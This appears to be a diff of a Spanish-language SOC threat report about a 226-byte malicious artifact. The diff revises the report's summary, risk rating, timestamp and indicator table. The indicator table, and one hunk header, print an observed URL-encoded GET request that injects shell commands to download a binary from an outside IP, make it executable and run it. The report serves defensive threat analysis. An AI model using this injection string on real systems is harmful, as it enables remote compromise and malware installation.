@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto de 226 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.30. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T21:07:53+00:00`
+- **Registrado:** `2026-08-09T21:07:53.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -52,8 +52,8 @@ GET /?redirect=$1?cd+%2Ftmp%3B+rm+x86%3B+wget+http%3A%2F%2F31.56.209.XXX%2Fx86%3
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
 | ip | 190.179.177.XXX | static_analysis |
-| hash | ae61a3630dac500b86ea7fa628d3de1c5f788d23b317e0a588a6b84d73aab5c0 | static_analysis |
 | command | GET /?redirect=$1?cd+%2Ftmp%3B+rm+x86%3B+wget+http%3A%2F%2F31.56.209.XXX%2Fx86%3B+chmod+777+x86%3B.%2Fx86+nginx%3B HTTP/ | strings |
+| hash | ae61a3630dac500b86ea7fa628d3de1c5f788d23b317e0a588a6b84d73aab5c0 | static_analysis |
 | ip | 45.198.224.XXX | artifact_source |
 
 ## 🔎 Triage
